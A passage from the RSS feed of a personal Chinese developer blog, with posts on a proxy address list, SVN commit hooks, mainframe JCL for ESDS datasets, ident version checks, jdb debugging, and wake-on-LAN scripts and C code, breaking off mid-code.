.141.171:8080<br>http://189.56.100.42:3128<br>http://189.108.214.18:3128<br>http://202.51.107.37:8080<br>http://189.59.15.234:3128<br>http://201.93.162.220:3128<br>http://195.56.55.206:3128<br>http://174.142.104.57:3128<br>http://210.243.157.250:3128<br>http://217.112.217.218:80<br>http://210.243.157.250:3128<br>http://217.10.246.4:8080<br>http://202.143.140.250:8080<br>http://217.109.154.234:3128<br>http://222.165.130.82:80<br>http://222.165.130.82:3128<br>http://58.68.168.170:80<br>http://58.68.168.46:80<br>http://58.68.168.97:80<br>http://58.68.168.45:80<br>http://58.68.168.84:80<br>http://58.68.168.74:80<br>http://58.68.168.44:80<br>http://58.68.168.42:80<br>http://58.68.168.193:80<br>http://58.68.168.171:80<br>http://58.68.168.192:80<br>http://58.68.168.40:80<br>http://62.233.138.180:3128<br>http://60.248.227.175:3128<br>http://80.92.180.246:8080<br>http://83.17.123.186:8080]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Admin</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937201010224559237/</guid>
    </item>
    <item>
      <title>
<![CDATA[SVN自动通知脚本]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/3373193720096604833141/</link>
      <description>
<![CDATA[需求：首先，要求每次提交都有不小与10个字符的Message；然后，每次提交后，自动邮件通知<br>方法：在SVN目录(${SVNDIR})下的hooks子目录下创建两个脚本文件 pre-commit和post-commit<br>${SVNDIR}/hooks/pre-commit<br>#!/bin/sh<br>REPOS="$1"<br>TXN="$2"<br>SVNLOOK=/usr/bin/svnlook<br># check that logmessage contains at least 5 alphanumeric characters<br>LOGMSG=`$SVNLOOK log -t "$TXN" "$REPOS" | grep "[a-zA-Z0-9]" | wc -c`<br>if [ "$LOGMSG" -lt 10 ];<br>then<br>&nbsp; echo -e "\nEmpty log message not allowed. Commit aborted!" 1&gt;&amp;2<br>&nbsp; exit 1<br>fi<br><br>${SVNDIR}/hooks/post-commit<br>REPOS="$1"<br>REV="$2"<br><br>/usr/bin/svnnotify --repos-path "$1" --revision "$2" --to hankjin@163.com --to svnuser2@gmail.com --to svnuser3@163.com --from hankjin@163.com --handler "HTML::ColorDiff" --with-diff --smtp &lt;smtp.163.com&gt; --smtp-user &lt;username&gt; --smtp-pass &lt;password&gt; --svnlook /usr/bin/svnlook --subject-prefix '[SVN Update]' &gt; /home/hankjin/svn.log 2&gt;&gt;/home/hankjin/svn.log<br><br>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Develop</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/3373193720096604833141/</guid>
    </item>
    <item>
      <title>
<![CDATA[Ubuntu下写日记]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937201101985038153/</link>
      <description>
<![CDATA[武汉的两年半，心情大起大落，经历了很多，想了很多，忘记的更多。<br>新的一年，也要离开武汉了，想把心路历程记下，于是就想写日记了。问题随之而来：在哪里写？<br>网络日记本不太靠谱，一者回家后不能用，二者不放心。于是找到了Ubuntu的软件Almanah，很简单。<br>从1月1日开始写起，12日突然心血来潮，笔记本格式化了，于是11篇日记就随风而逝了。<br>No Pains, No Gains。让Almanah能够网络同步，这样就不怕丢了。像EverNote一样，可以同步到网上，也可以从网上同步到本地。<br>apt-get source almanah<br>查看almanah源代码，用的是gtk+界面，sqlite数据库，解决思路：sync_up就把sqlite上传，sync_down就从网上下载。<br>先去data/almanah.ui中添加两个菜单项，然后编写相应的上传于下载函数，再在服务器端写一个上传和下载到php页面即可。<br>服务器端到php程序没问题，上传下载等闲事耳。客户端用的是C语言，C语言的HTTP类库，以前还真没用过，google一下，找到一个libghttp，但好像很久都没开发了，简单到功能到还可以，上传文件好像不行，继续找，libcurl，很好很强大！补丁在这里<br>http://code.google.com/p/pyfarm/source/browse/trunk/patch/]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Develop</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937201101985038153/</guid>
    </item>
    <item>
      <title>
<![CDATA[ESDS-TS-CICSHelp]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/3373193720078610174226/</link>
      <description>
<![CDATA[<P>首先创建一个ESDS数据集，然后把数据加入数据集，然后用程序读进TSQ，帮助文件就从TSQ里取。</P>
<P>这是刘给的程序，让我帮部署一下，费了九牛二虎之力终于部署上了，他给我的两个JCL都不能用，BS一下<IMG src="http://st.blog.163.com/style/common/htmlEditor/portrait/face/preview/face54.gif">。</P>
<P>程序有一个Bug，不知道逻辑按照语法修改通过，程序运行结果出现一个O格式错误，基本成功。眼睛累坏了，赶紧休息去。</P>
<P>创建ESDS的JCL：</P>
<P>//ST097CE&nbsp; JOB&nbsp; HJZ,CLASS=A,MSGCLASS=X,NOTIFY=&amp;SYSUID&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>//STEP1&nbsp;&nbsp;&nbsp; EXEC PGM=IDCAMS&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>//SYSPRINT DD SYSOUT=*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>//SYSIN&nbsp;&nbsp;&nbsp; DD *&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; DEFINE CLUSTER&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; -&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; -&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; NAME(ST097.CITY.ESDS.HELP)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; -&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; VOL(USER02)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; -&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; TRACKS(4,2)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; -&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; CONTROLINTERVALSIZE(4096)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; -&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; RECORDSIZE(79,79)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; -&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; NONINDEXED&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; -&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; )&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; -&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; DATA&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; -&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; -&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; NAME(ST097.CITY.ESDS.HELP.DATA)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; -&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; )&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>/*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>//&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </P>
<P>导入数据的JCL：</P>
<P>//ST097&nbsp;&nbsp;&nbsp; JOB&nbsp; HJZ,CLASS=A,MSGCLASS=X,NOTIFY=&amp;SYSUID&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>//STEP1&nbsp;&nbsp;&nbsp; EXEC PGM=IDCAMS&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>//SYSPRINT DD SYSOUT=*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>//INDSN&nbsp;&nbsp;&nbsp; DD DSN=ST097.CITY.PS.HELP,DISP=OLD&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>//OUTDSN&nbsp;&nbsp; DD DSN=ST097.CITY.ESDS.HELP,DISP=OLD&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>//SYSIN DD *&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp; REPRO&nbsp; INFILE(INDSN) OUTFILE(OUTDSN)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>/*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>//&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </P>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>MVS</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/3373193720078610174226/</guid>
    </item>
    <item>
      <title>
<![CDATA[用ident检查依赖的lib库版本]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937201210291139489/</link>
      <description>
<![CDATA[<div>hankjin@ps-hankjin:~/code$ cat lib1.cc</div><div>static char const rcsid[] = "$Id: ps/se/lib1 1.0 $";</div><div>hankjin@ps-hankjin:~/code$ cat lib2.cc</div><div>static char const rcsid[] = "$Id: ps/se/lib2 2.0 $";</div><div>hankjin@ps-hankjin:~/code$ cat hjz.cc&nbsp;</div><div>#include &lt;stdio.h&gt;</div><div>static char const rcsid[] = "$Id: ps/se/hjz 3.0 $";</div><div>int main() {</div><div>&nbsp; &nbsp; return printf("%s\n", rcsid) == EOF;&nbsp;</div><div>}</div><div><br></div><div>hankjin@ps-hankjin:~/code$ c++ lib1.cc lib2.cc hjz.cc</div><div>hankjin@ps-hankjin:~/code$ ident a.out&nbsp;</div><div>a.out:</div><div>&nbsp; &nbsp; &nbsp;$Id: ps/se/lib1 1.0 $</div><div>&nbsp; &nbsp; &nbsp;$Id: ps/se/lib2 2.0 $</div><div>&nbsp; &nbsp; &nbsp;$Id: ps/se/hjz 3.0 $</div><wbr>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Unix</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937201210291139489/</guid>
    </item>
    <item>
      <title>
<![CDATA[基于JDK1.6的WebServiceClient测试插件]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937200792292640260/</link>
      <description>
<![CDATA[<P>版本一：</P>
<P>第一步，要求用户输入一个url或者wsdl文件</P>
<P>第二步，要求用户输入测试变量的初始值</P>
<P>第三步，执行wsimport和test.Client.java</P>
<P>第四部，运行测试</P>
<P>第五步，显示结果，分析错误。</P>
<P>版本二：</P>
<P>使用配制文件作为输入，执行多次测试</P>
<P>版本三：</P>
<P>生成带UI的测试程序</P>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>MVS</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937200792292640260/</guid>
    </item>
    <item>
      <title>
<![CDATA[使用jdb调试Java程序]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/3373193720071192537538/</link>
      <description>
<![CDATA[<P>Java调试工具使用的大多数信息和方法都是由JVM自己提供的，好比各种IDE都是用的JDK一样，调试都是用的JDB</P>
<P>在一个窗口中执行如下命令来调试Test类</P>
<P>java -Xdebug -Xrunjdwp:transport=dt_socket,suspend=y,server=y,address=8000 Test</P>
<P>然后在另外一个窗口执行如下命令开始调试</P>
<P>jdb -connect com.sun.jdi.SocketAttach:port=8000</P>
<P>输入help命令可以获得很详细的帮助信息</P>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>J2SE</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/3373193720071192537538/</guid>
    </item>
    <item>
      <title>
<![CDATA[自动开机 双网卡网络唤醒]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/3373193720091112101516694/</link>
      <description>
<![CDATA[<style>body { font-family:tahoma; font-size:10pt } p { font-family:tahoma; font-size:10pt } div { font-family:tahoma; font-size:10pt } td { font-family:tahoma; font-size:10pt } </style><div>网络唤醒主要需要主板支持， 在BIOS里设置Wake on lan[Enable]</div>
<div>网络唤醒的包很容易构建，但是在网管服务器上始终不能工作，刚开始以为是程序的问题，<br>后来发现Ubuntu里有一个wakeonlan的perl脚本，在ubuntu上工作正常，而在网关上却不能正常工作<br>最后发现是好像是双网卡的问题，给wakeonlan加上一个-i参数指定内网的ip，启动成功！<br>sudo apt-get install wakeonlan #实际就是在/usr/bin下生成一个名为wakeonlan的perl脚本，拷贝到Fedora等也可以用。<br>wakeonlan -i 192.201.0.255 00:1c:25:db:bd:46<br><br>贴上一个c语言的网络唤醒代码<br>#include &lt;stdio.h&gt;<br>#include &lt;stdlib.h&gt;<br>#include &lt;string.h&gt;<br>#include &lt;sys/types.h&gt;<br>#include &lt;sys/socket.h&gt;<br>#include &lt;netinet/in.h&gt;<br>#define oops(msg) {perror(msg); exit(1);}<br><br>int main(int argc, char* argv[]){<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;char mac[6];<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;char packet[102];<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;struct sockaddr_in addr;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;int sockid, i, on = 1;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;char * p = "00:1c:25:db:bd:46";/* destination host ip address*/<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sscanf(p, "%2x:%2x:%2x:%2x:%2x:%2x",<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mac, mac+1, mac+2, mac+3, mac+4, mac+5);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;memset(packet, 0xff, 6);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for(i = 0; i &lt; 16; i ++){<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;memcpy(packet + 6*(i+1), mac, sizeof(mac));<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sockid = socket(AF_INET, SOCK_DGRAM, 0);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;setsockopt(sockid, SOL_SOCKET, SO_BROADCAST,&amp;on, sizeof(on));<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(sockid == 